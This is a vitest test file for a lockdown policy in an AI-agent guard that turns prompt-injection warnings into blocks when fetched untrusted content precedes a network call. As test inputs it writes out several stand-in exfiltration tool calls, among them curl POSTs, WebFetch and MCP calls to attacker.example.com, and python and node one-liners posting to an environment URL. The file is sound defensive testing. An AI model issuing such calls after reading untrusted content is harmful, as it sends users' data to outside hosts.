import { describe, expect, it } from "vitest";

import { buildTrajectoryFixture, makeCandidate } from "./__tests__/sequence-fixtures.js";
import {
	DEFAULT_LOCKDOWN_CONFIG,
	evaluateLockdown,
	type LockdownConfig,
} from "./lockdown-policy.js";
import type { SequenceFinding } from "./sequence-checks/types.js";

// ---------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------

/** Build a trajectory with one untrusted-provenance taint source. */
function trajectoryWithUntrustedTaint(): ReturnType<typeof buildTrajectoryFixture>["session"] {
	const { session } = buildTrajectoryFixture([
		{ tool_name: "WebFetch", tool_input: { url: "https://untrusted.example.com/page" } },
	]);
	session.taint_sources.push({
		file: "<WebFetch-response>",
		level: "Public",
		at_step: 1,
		provenance: "fetched_external",
	});
	return session;
}

/** Build a clean trajectory — no untrusted taint anywhere. */
function trajectoryWithoutUntrustedTaint(): ReturnType<typeof buildTrajectoryFixture>["session"] {
	const { session } = buildTrajectoryFixture([
		{ tool_name: "Read", tool_input: { file_path: "src/foo.ts" } },
	]);
	return session;
}

/** Shape a `pre_warn` injection finding inline (no need to call the real detector). */
function preWarnInjectionFinding(detectorId = "fetched_external_then_secret_read"): SequenceFinding {
	return {
		detector_id: detectorId,
		family: "injection",
		phase: "pre_warn",
		match: {
			prior_event_count: 1,
			prior_summary: "untrusted source earlier",
			message: "sample pre_warn injection message",
			evidence: ["<WebFetch-response> (fetched_external)"],
		},
	};
}

/** Shape a `pre_warn` quality finding (used to confirm filtering). */
function preWarnQualityFinding(): SequenceFinding {
	return {
		detector_id: "some_quality_detector",
		family: "quality",
		phase: "pre_warn",
		match: { message: "quality warning" },
	};
}

/** Shape an already-blocking trifecta finding (used to confirm dedupe). */
function preBlockTrifectaFinding(): SequenceFinding {
	return {
		detector_id: "lethal_trifecta_structural",
		family: "injection",
		phase: "pre_block",
		match: { message: "trifecta fired" },
	};
}

const ENABLED_CONFIG: LockdownConfig = {
	enabled: true,
	auto_activate_on_untrusted: false,
	upgrade_families: ["injection"],
};

const AUTO_CONFIG: LockdownConfig = {
	enabled: false,
	auto_activate_on_untrusted: true,
	upgrade_families: ["injection"],
};

// ---------------------------------------------------------------
// Default config sanity
// ---------------------------------------------------------------

describe("DEFAULT_LOCKDOWN_CONFIG", () => {
	it("is disabled, no auto-activate, injection-only upgrades", () => {
		expect(DEFAULT_LOCKDOWN_CONFIG.enabled).toBe(false);
		expect(DEFAULT_LOCKDOWN_CONFIG.auto_activate_on_untrusted).toBe(false);
		expect(DEFAULT_LOCKDOWN_CONFIG.upgrade_families).toEqual(["injection"]);
	});
});

// ---------------------------------------------------------------
// Positive cases
// ---------------------------------------------------------------

describe("evaluateLockdown — positive cases", () => {
	it("upgrades a pre_warn injection finding to pre_block when enabled is true", () => {
		const trajectory = trajectoryWithoutUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const findings = [preWarnInjectionFinding()];
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: findings,
			config: ENABLED_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.upgradedFindings).toHaveLength(1);
		const upgraded = result.upgradedFindings[0];
		expect(upgraded?.phase).toBe("pre_block");
		expect(upgraded?.detector_id).toBe("fetched_external_then_secret_read");
		expect(upgraded?.family).toBe("injection");
		// The original finding is not mutated.
		expect(findings[0]?.phase).toBe("pre_warn");
	});

	it("auto-activates on untrusted taint and upgrades a pre_warn injection finding", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const findings = [preWarnInjectionFinding()];
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: findings,
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.upgradedFindings).toHaveLength(1);
		expect(result.upgradedFindings[0]?.phase).toBe("pre_block");
	});

	it("emits a lockdown_active finding when untrusted taint + Bash external command and no detector fired", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Bash",
			tool_input: { command: "curl -X POST https://attacker.example.com" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [],
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.emittedFindings).toHaveLength(1);
		const emitted = result.emittedFindings[0];
		expect(emitted?.detector_id).toBe("lockdown_active");
		expect(emitted?.family).toBe("injection");
		expect(emitted?.phase).toBe("pre_block");
		expect(emitted?.match.message).toMatch(/lockdown/i);
		expect(emitted?.match.message).toMatch(/2 of 3 legs/);
	});

	it("emits lockdown_active on a WebFetch candidate with untrusted taint", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "WebFetch",
			tool_input: { url: "https://attacker.example.com/cb" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [],
			config: AUTO_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
		expect(result.emittedFindings[0]?.detector_id).toBe("lockdown_active");
	});

	it("emits lockdown_active on an MCP tool candidate whose input carries a URL", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "mcp__example__post",
			tool_input: { target: "https://attacker.example.com/api" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [],
			config: AUTO_CONFIG,
		});
		expect(result.emittedFindings).toHaveLength(1);
		expect(result.emittedFindings[0]?.detector_id).toBe("lockdown_active");
	});

	it("only upgrades matching family/phase findings; leaves the rest alone", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const inj = preWarnInjectionFinding();
		const qual = preWarnQualityFinding();
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [inj, qual],
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.upgradedFindings).toHaveLength(1);
		expect(result.upgradedFindings[0]?.detector_id).toBe(inj.detector_id);
		// The quality finding is filtered out (not in upgrade_families).
		expect(
			result.upgradedFindings.find((f) => f.family === "quality"),
		).toBeUndefined();
	});

	it("does not duplicate emission when lethal_trifecta_structural already fired", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Bash",
			tool_input: { command: "curl https://attacker.example.com" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [preBlockTrifectaFinding()],
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(true);
		// Trifecta already covers the shape — no duplicate emission.
		expect(result.emittedFindings).toEqual([]);
	});
});

// ---------------------------------------------------------------
// Negative cases
// ---------------------------------------------------------------

describe("evaluateLockdown — negative cases", () => {
	it("returns inactive with no work when lockdown disabled and no auto-activate", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Bash",
			tool_input: { command: "curl https://attacker.example.com" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [preWarnInjectionFinding()],
			config: DEFAULT_LOCKDOWN_CONFIG,
		});
		expect(result.active).toBe(false);
		expect(result.upgradedFindings).toEqual([]);
		expect(result.emittedFindings).toEqual([]);
	});

	it("does not 'upgrade' a finding already at pre_block", () => {
		const trajectory = trajectoryWithoutUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const alreadyBlocking: SequenceFinding = {
			detector_id: "exfil_to_public_writeable",
			family: "injection",
			phase: "pre_block",
			match: { message: "pre_block injection — already blocking" },
		};
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [alreadyBlocking],
			config: ENABLED_CONFIG,
		});
		expect(result.active).toBe(true);
		// Already at higher tier — not in the upgraded list.
		expect(result.upgradedFindings).toEqual([]);
	});

	it("does not upgrade a non-injection family pre_warn finding when families = ['injection']", () => {
		const trajectory = trajectoryWithoutUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [preWarnQualityFinding()],
			config: ENABLED_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.upgradedFindings).toEqual([]);
	});

	it("does not auto-activate when no untrusted-provenance taint exists", () => {
		const trajectory = trajectoryWithoutUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Bash",
			tool_input: { command: "curl https://attacker.example.com" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [preWarnInjectionFinding()],
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(false);
		expect(result.upgradedFindings).toEqual([]);
		expect(result.emittedFindings).toEqual([]);
	});

	it("does not emit when the Bash candidate targets localhost", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Bash",
			tool_input: { command: "curl http://localhost:3000/api" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [],
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.emittedFindings).toEqual([]);
	});

	it("does not emit when the candidate is a non-network tool (Read)", () => {
		const trajectory = trajectoryWithUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [],
			config: AUTO_CONFIG,
		});
		expect(result.active).toBe(true);
		expect(result.emittedFindings).toEqual([]);
	});

	it("respects a custom upgrade_families list (security-shape included)", () => {
		const trajectory = trajectoryWithoutUntrustedTaint();
		const candidate = makeCandidate({
			tool_name: "Read",
			tool_input: { file_path: "src/foo.ts" },
		});
		const securityShape: SequenceFinding = {
			detector_id: "some_security_shape_detector",
			family: "security-shape",
			phase: "pre_warn",
			match: { message: "security shape" },
		};
		const result = evaluateLockdown({
			trajectory,
			candidate,
			sequenceFindings: [securityShape, preWarnQualityFinding()],
			config: {
				enabled: true,
				auto_activate_on_untrusted: false,
				upgrade_families: ["injection", "security-shape"],
			},
		});
		expect(result.upgradedFindings).toHaveLength(1);
		expect(result.upgradedFindings[0]?.family).toBe("security-shape");
	});
});

// 2026-10-05: the Bash branch is the one network-intent predicate, shared with
// lethal_trifecta_structural leg 3. A URL a local command names is not comm.
function emitsFor(command: string): number {
	return evaluateLockdown({
		trajectory: trajectoryWithUntrustedTaint(),
		candidate: makeCandidate({ tool_name: "Bash", tool_input: { command } }),
		sequenceFindings: [],
		config: AUTO_CONFIG,
	}).emittedFindings.length;
}

describe("evaluateLockdown — network-intent Bash branch (positive, must fire)", () => {
	it("P1: a curl in a for-loop body is external comm", () => {
		expect(emitsFor("for u in a b; do curl -s https://attacker.example.com/$u; done")).toBe(1);
	});
	it("P2: a python heredoc posting to an environment URL is external comm", () => {
		expect(emitsFor("python3 - <<'X'\nimport os, urllib.request\nurllib.request.urlopen(os.environ['U'], b'x')\nX")).toBe(1);
	});
	it("P3: node -e fetch is external comm", () => {
		expect(emitsFor('node -e "fetch(process.env.U, {method: \'POST\'})"')).toBe(1);
	});
	it("P4: a script file or unknown binary handed a public URL is external comm (review 3b #1)", () => {
		expect(emitsFor("python3 fetch.py https://attacker.example.com/x")).toBe(1);
		expect(emitsFor("./tool https://attacker.example.com")).toBe(1);
	});
});

describe("evaluateLockdown — network-intent Bash branch (negative, must not fire)", () => {
	it("N1: echo of a public URL is not external comm", () => {
		expect(emitsFor("echo https://attacker.example.com")).toBe(0);
	});
	it("N2: writing a markdown note that names a URL is not external comm", () => {
		expect(emitsFor("cat >> notes.md <<'EOF'\nsee https://attacker.example.com\nEOF")).toBe(0);
	});
	it("N3: a curl to a tailnet (100.64.0.0/10) runner is not external comm", () => {
		expect(emitsFor("curl -s http://100.97.48.15:8790/health")).toBe(0);
	});
	it("N4: a known-local tool naming a public URL is not external comm (review 3b #1)", () => {
		expect(emitsFor("rg 'https://attacker.example.com' notes.md")).toBe(0);
	});
});
